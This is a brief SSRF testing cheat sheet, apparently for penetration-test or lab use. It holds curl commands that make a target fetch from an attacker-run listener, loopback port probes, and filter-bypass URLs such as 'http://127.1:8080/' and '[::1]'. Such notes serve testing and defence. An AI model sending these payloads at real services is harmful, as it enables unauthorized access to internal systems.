# Server-side request forgery (SSRF)

Check URL fetchers: previews, imports, webhooks, PDF/file converters.

## Confirm the fetch
```bash
python3 -m http.server 8000
curl -G 'http://<IP>/fetch' --data-urlencode 'url=http://<KALI>:8000/ssrf-check-01'
```
- Listener hit = server fetch; reflection alone isn't. No hit → reachability, delayed jobs.

## What it can reach
Compare a known local port with an unused one.

```bash
curl -G 'http://<IP>/fetch' --data-urlencode 'url=http://127.0.0.1:8080/'
```
Filter bypass (`127.0.0.1` = target's loopback):

```text
http://allowed.example@127.0.0.1:8080/
http://127.1:8080/
http://[::1]:8080/
http://<allowed-host>/redirect-to-loopback
```
